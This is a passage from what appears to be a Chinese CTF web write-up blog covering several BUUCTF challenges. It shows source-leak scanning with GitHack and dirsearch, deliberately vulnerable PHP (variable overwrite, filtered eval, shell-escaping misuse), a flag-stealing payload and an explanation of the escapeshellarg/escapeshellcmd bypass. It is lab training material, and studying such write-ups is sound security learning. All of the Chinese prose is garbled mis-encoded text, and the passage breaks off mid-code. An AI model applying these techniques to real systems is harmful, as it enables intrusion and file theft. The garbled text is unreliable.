alt="cat6"></p><p>è¿™ç©æ„å„¿æ˜¯ä¸ª<code>Django</code>æŠ¥é”™ç•Œé¢(æ„Ÿè§‰æœ‰ç‚¹åƒä»Šå¹´NSCTFé‚£é“é¢˜çš„æŠ¥é”™ç•Œé¢)ï¼š</p><p><code>illegal multibyte sequence æ„æ€æ˜¯éæ³•çš„å¤šå­—èŠ‚åºåˆ—</code></p><p>è€ŒGBKè¿™ä¸œè¥¿é¢å¯¹è¶…è¿‡0x7Fçš„æ—¶å€™ä¼šç”¨ä¸¤ä¸ªå­—ç¬¦è¡¨ç¤ºã€‚æ„Ÿè§‰å°±æ˜¯è¿™é‡Œå‡ºäº†é—®é¢˜ï¼šè¶…è¿‡%7Fçš„URLå‡ä¼šæŠŠæŠ¥é”™ã€‚</p><p>è€Œä¸”å½“ <code>CURLOPT_SAFE_UPLOAD</code> ä¸º true æ—¶ï¼Œå¦‚æœåœ¨è¯·æ±‚å‰é¢åŠ ä¸Š@çš„è¯phpcurlç»„ä»¶æ˜¯ä¼šæŠŠåé¢çš„å½“ä½œç»å¯¹è·¯å¾„è¯·æ±‚ï¼Œæ¥è¯»å–æ–‡ä»¶ã€‚</p><p><img src="/img/cat7.png" alt="cat7"></p><p>æ¥ä¸‹æ¥æœ‰ä¸¤ç§æ–¹æ³•ï¼šä¸€ç§å…ˆæ‰¾settings.pyåœ¨æ‰¾databaseï¼Œå¦ä¸€ç§ç›´æ¥åœ¨æŠ¥é”™é¡µé¢ctrl+fæ‰¾database:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>api/database.sqlite3<br></code></pre></td></tr></table></figure><p>djangoé¡¹ç›®ç”Ÿæˆæ—¶settings.pyä¼šå­˜æ”¾åœ¨é¡¹ç›®ç›®å½•ä¸‹å†ä»¥é¡¹ç›®åç§°å‘½åçš„æ–‡ä»¶å¤¹ä¸‹é¢:</p><p><code>/opt/api/api/settings.py</code></p><p>è¿›æ•°æ®åº“é‡Œç›´æ¥ctrl+Fç„¶åæ‰¾CTFå°±å¥½äº†ã€‚ã€‚ä¸è¿‡æˆ‘åšè¿™é“é¢˜çš„æ—¶å€™ä¸çŸ¥é“å’‹å›äº‹æ²¡æ³•è¯»ï¼Œä¸€ç›´è¿›çš„æ˜¯é‚£é¡µæŠ¥é”™ä¿¡æ¯ã€‚ã€‚ã€‚MD</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>è¿›ç¯å¢ƒå‘ç°æ˜¯ä¸ªç½‘é¡µï¼š</p><p><img src="/img/a4.png" alt="a4"></p><p>æ„Ÿè§‰åƒæ˜¯æ•æ„Ÿæ–‡ä»¶æ³„éœ²çš„é¢˜ï¼Ÿå…ˆè¯•è¯•&#x2F;.gitå†ç”¨dirsearchæ‰«ï¼š</p><p><img src="/img/a5.png" alt="a5"></p><p>æœ‰ä¸œè¥¿ï¼Œç›´æ¥ä¸ŠGithackï¼š</p><p><code>python GitHack.py http://af058f36-8fc4-47ff-86be-d9b094d1187b.node4.buuoj.cn/.git/</code></p><p>å‘ç°æœ‰<code>index.php</code>å’Œ<code>flag.php</code>ï¼š</p><p><img src="/img/a6.png" alt="a6"></p><p>è¿™é‡Œç¢°äº†é’‰å­ï¼šæœ‰æ—¶å€™Githackä¸çŸ¥é“æ˜¯æ‰«å¤ªå¿«äº†è¿˜æ˜¯å’‹å›äº‹ï¼Œæ— æ³•ä¸‹è½½æ‰«å‡ºæ¥çš„æ–‡ä»¶(æ¯”å¦‚ä¸€å¼€å§‹æˆ‘å°±æ‰¾ä¸åˆ°ä¸‹è½½çš„flag.phpå’Œindex.php)ã€‚åæ¥åœ¨ç½‘ä¸Šæ‰¾äº†åŠå¤©ï¼Œå¤§ä½¬è¯´æ˜¯çº¿ç¨‹å¤ªå¤šçš„åŸå› ï¼ŒæŠŠçº¿ç¨‹æ”¹å°å°±å¯ä»¥ä¸è¢«æ‹’ç»è®¿é—®ï¼Œæ–¹æ³•ï¼š</p><p><img src="/img/a7.png" alt="a7"></p><p>è¿™ä¸œè¥¿æœ¬æ¥æ˜¯10ï¼Œç»™æ”¹æˆ1å°±å¥½äº†ã€‚</p><p>(æˆ‘æ„Ÿè§‰æ˜¯æˆ‘ç”¨windowsçš„åŸå› ã€‚ã€‚ï¼Ÿå› ä¸ºä¹‹å‰dirsearchä¹Ÿå‡ºç°è¿‡è¿™ç§æƒ…å†µï¼Œç”¨Linuxå°±æ­£å¸¸äº†)</p><p><img src="/img/a8.png" alt="a8"></p><p>çœ‹çœ‹ä»–ä¿©æœ‰å•¥ä¸œè¥¿ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs PHP">index.php:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;  POSTä¼ x=y<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>;  <span class="hljs-comment">//å˜é‡è¦†ç›–,å˜é‡(xçš„å€¼)=y</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123; GETä¼ x=y<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>; <span class="hljs-comment">//åŒä¸Šï¼Œå˜é‡(xçš„å€¼)=å˜é‡(yçš„å€¼)</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;  <span class="hljs-comment">//éå†GETä¼ çš„</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);  <span class="hljs-comment">//ç»ˆæ­¢è„šæœ¬æ‰§è¡Œå¹¶è¿”å›$handsome</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<span class="hljs-comment">//GETã€POSTå‡æ²¡ä¼ flag</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);  <span class="hljs-comment">//ç»ˆæ­¢è„šæœ¬æ‰§è¡Œå¹¶è¿”å›$yds</span><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>); <span class="hljs-comment">//ç»ˆæ­¢è„šæœ¬æ‰§è¡Œå¹¶è¿”å›$is</span><br>&#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br><br>flag.php:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>$flagå·²ç»å®šä¹‰ï¼Œè¦æƒ³åŠæ³•æŠŠ$flagæå‡ºæ¥ã€‚ä½†é€šç¯‡åªæœ‰åˆ©ç”¨exitå»æ˜¾ç¤º$ydsã€$isã€$handsomeï¼Œå’Œå˜é‡è¦†ç›–è”ç³»ä¸€ä¸‹ï¼šæ˜¯å¦å¯ä»¥åˆ©ç”¨å˜é‡è¦†ç›–ç›´æ¥exit($flag)ï¼Ÿ</p><p>ç¬¬äºŒä¸ªflagåœ¨æˆ‘çœ‹æ¥æœ€å¥½æ»¡è¶³ï¼šåªè¦GETPOSTéƒ½ä¸ä¼ flagå°±è¡Œäº†ï¼Œä½†æ˜¯å¦‚ä½•exit($flag)ï¼Ÿ</p><p><code>$yds=$flag</code>  $(xçš„å€¼)&#x3D;$(yçš„å€¼)-&gt;GETä¼ <code>yds=flag</code></p><p>payloadï¼š<code>/index.php?yds=flag</code></p><h2 id="BUUCTF-2018-Online-Tool-è¿˜æ²¡åšå®Œæ ‡è®°ä¸€ä¸‹"><a href="#BUUCTF-2018-Online-Tool-è¿˜æ²¡åšå®Œæ ‡è®°ä¸€ä¸‹" class="headerlink" title="[BUUCTF 2018]Online Tool è¿˜æ²¡åšå®Œæ ‡è®°ä¸€ä¸‹"></a>[BUUCTF 2018]Online Tool è¿˜æ²¡åšå®Œæ ‡è®°ä¸€ä¸‹</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<span class="hljs-comment">//1.ç¡®ä¿ç”¨æˆ·åªä¼ é€’ä¸€ä¸ªå‚æ•°ç»™å‘½ä»¤ã€‚2ç”¨æˆ·ä¸èƒ½æŒ‡å®šæ›´å¤šçš„å‚æ•°ã€‚3.ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚</span><br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<span class="hljs-comment">//1.ç¡®ä¿ç”¨æˆ·åªæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚2.ç”¨æˆ·å¯ä»¥æŒ‡å®šä¸é™æ•°é‡çš„å‚æ•°ã€‚3.ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚ è¿™ä¸¤ä¸ªå‡½æ•°ä¸€èµ·ä½¿ç”¨ä¼šå­˜åœ¨æ¼æ´ã€‚</span><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;    <span class="hljs-comment">//-T5 : å¯ä»¥åŠ å¿«æˆ–è€…å‡æ…¢æ‰«æé€Ÿåº¦ï¼Œæœ‰å…­ä¸ªçº§åˆ«ï¼Œçº§åˆ«è¶Šé«˜é€Ÿåº¦è¶Šå¿«ï¼Œä¹Ÿè¶Šå®¹æ˜“è¢«WAFæˆ–è€…IDSå‘ç°ã€‚-sTï¼šä½¿ç”¨TCP Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£ï¼Œä¼šå®Œæ•´çš„æ‰§è¡Œå®ŒTCPçš„ä¸‰æ¬¡æ¡æ‰‹ï¼Œéšè”½æ€§ä¸å¼ºã€‚-Pnï¼šæœ‰æ—¶å€™é˜²ç«å¢™ä¼šç¦æ­¢pingè¯·æ±‚.-PNå‘½ä»¤å‘Šè¯‰Nmapä¸ç”¨pingè¿œç¨‹ä¸»æœºã€‚â€“host-timeout ï¼šé™åˆ¶æ¯ä¸ª IP åœ°å€çš„æ‰«ææ—¶é—´(å•ä½ä¸ºç§’).-Fï¼šè¦æ±‚æ‰«ææ—¶(åŒ…æŒºpingæ‰«æ)ä½¿ç”¨å°çš„IPåŒ…åˆ†æ®µã€‚</span><br></code></pre></td></tr></table></figure><p>çœ‹äº†å…¶å®ƒå¸ˆå‚…ä»¬çš„wpï¼Œé—®é¢˜ä¸»è¦å‡ºåœ¨è¿ç»­ä½¿ç”¨<code>escapeshellarg</code> å’Œ <code>escapeshellcmd</code>ä¸Šï¼šåŒæ—¶ä½¿ç”¨ä¼šå¯¼è‡´ç»•è¿‡è¿‡æ»¤æ‰§è¡Œå‘½ä»¤ï¼š</p><p>ä»¥ä¸‹å†…å®¹å‚è€ƒäº†X1r0zå¸ˆå‚…çš„åšå®¢ï¼š</p><p><code>https://exp10it.cn/2022/08/buuctf-web-writeup-3/#buuctf-2018online-tool</code></p><blockquote><p>escapeshellarg() ä¼šåœ¨å•å¼•å·ä¹‹å‰åŠ ä¸Š <code>\</code>, å¹¶åœ¨è¢«è½¬ä¹‰çš„å•å¼•å·ä¸¤è¾¹å’Œæ•´ä¸ªå­—ç¬¦ä¸²ä¸¤è¾¹åŠ ä¸Šå•å¼•å·</p><p>escapeshellcmd() ä¼šåœ¨æ‰€æœ‰çš„ <code>\</code> å‰åŠ ä¸Š <code>\</code>, å½¢æˆ <code>\\</code>, å¹¶åœ¨<strong>ä¸æˆå¯¹</strong>çš„å•å¼•å·å‰åŠ  <code>\</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">123</span> -&gt; <span class="hljs-string">&#x27;123&#x27;</span> -&gt; <span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-comment"># æ­£å¸¸æ•ˆæœ</span><br>    <br><span class="hljs-number">123</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;\&#x27; # æœ€åä¸€ä¸ªå¼•å·ä¸æˆå¯¹, è¢«è½¬ä¹‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">123&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; # æ‰€æœ‰å¼•å·æˆå¯¹, ä¸è½¬ä¹‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;123&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; # æ‰€æœ‰å¼•å·æˆå¯¹, ä¸è½¬ä¹‰</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/weixin_43952190/article/details/<span class="hljs-number">105846175</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/shinygod/article/details/<span class="hljs-number">123207785</span>?utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>~default~baidujs_baidulandingword~default-<span class="hljs-number">0</span>-<span class="hljs-number">123207785</span>-blog-<span class="hljs-number">105846175</span>.<span class="hljs-number">235</span>^v38^pc_relevant_yljh&amp;spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4242</span>.<span class="hljs-number">1</span>&amp;utm_relevant_index=<span class="hljs-number">3</span><br><br><span class="hljs-attribute">https</span>://exp10it.cn/<span class="hljs-number">2022</span>/<span class="hljs-number">08</span>/buuctf-web-writeup-<span class="hljs-number">3</span>/#buuctf-<span class="hljs-number">2018</span>online-tool<br><br><span class="hljs-attribute">https</span>://blog.csdn.net/xhy18634297976/article/details/<span class="hljs-number">122852540</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6650</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;utm_relevant_index=<span class="hljs-number">2</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/weixin_44077544/article/details/<span class="hljs-number">102835099</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/xhy18634297976/article/details/<span class="hljs-number">122852540</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6650</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;utm_relevant_index=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p><img src="/img/tw1.png" alt="tw1"></p><p>æºç æ²¡å•¥ä¿¡æ¯ï¼Œç›´æ¥dirsearchæ‰«çœ‹çœ‹å§ï¼š</p><p><code>python dirsearch.py -u http://8126df41-22c6-4533-823d-8e6fc9622f9d.node4.buuoj.cn --delay 3 -t 30</code></p><p><img src="/img/tw2.png" alt="tw2"></p><p>æ‰«å‡ºæ¥å¾ˆå¤š.gitæ–‡ä»¶ã€‚ã€‚åº”è¯¥æ˜¯gitæ³„éœ²äº†ï¼Œç”¨GitHackå¼„å®ƒï¼š</p><p><code>python GitHack.py -u http://8126df41-22c6-4533-823d-8e6fc9622f9d.node4.buuoj.cn/.git/</code></p><p><img src="/img/tw3.png" alt="tw3"></p><p>ç°åœ¨windowsä¸‹çœ‹çœ‹ï¼Œä¸è¡Œå†ç”¨Kaliåšã€‚å‘ç°æœ‰ä¸ªIndex.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//æ­£åˆ™åŒ¹é…ï¼Œè¿‡æ»¤äº†ç‚¹ä¼ªåè®®è¦ç”¨çš„ä¸œè¥¿(æ¯”å¦‚data://å•¥çš„ï¼Œå‰é¢åŠ é‚£ä¸ª\æ˜¯è½¬ä¹‰ç”¨çš„)ï¼Œæ²¡è§¦å‘åˆ™è¿›è¡Œä¸‹ä¸€æ­¥åˆ¤æ–­ã€‚/iæ¨¡å¼ä¸åŒºåˆ†å¤§å°å†™</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//åŒ¹é…a-zï¼Œé€—å·å’Œ_ï¼Œ\(å’Œ\)åˆ†åˆ«æ˜¯è½¬ä¹‰åçš„å·¦æ‹¬å·å’Œå³æ‹¬å·ã€‚(?R)?è¿™ç©æ„å„¿æŸ¥äº†ä¸€ä¸‹è¯´æ˜¯é€’å½’æ¨¡å¼?æ­£åˆ™è¿‡æ»¤åçš„ç»“æœå¿…é¡»å¼ºç­‰äºåˆ†å·</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//åˆä¸€æ¬¡è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿                // echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs PHP">æ­£åˆ™åŒ¹é…ä¸­(?R)?é€’å½’æ¨¡å¼çš„è§£é‡Šï¼š<br>    ?Ræ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼((/[a-z,_]+((?R)?)/))ï¼Œå½¢æˆé€’å½’è°ƒç”¨ã€‚<br>    ?è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼<span class="hljs-number">0</span>æ¬¡æˆ–<span class="hljs-number">1</span>æ¬¡ã€‚è‹¥æ˜¯(?R)*åˆ™è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼<span class="hljs-number">0</span>æ¬¡æˆ–å¤šæ¬¡ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åŒ¹é…<span class="hljs-title function_ invoke__">a</span>(<span class="hljs-title function_ invoke__">b</span>(<span class="hljs-title function_ invoke__">c</span>()<span class="hljs-title function_ invoke__">d</span>()))ï¼Œä¸¾ä¸ªæ —å­ï¼š<br>    <br>    <br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a(b(c(d()f()e())));&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ 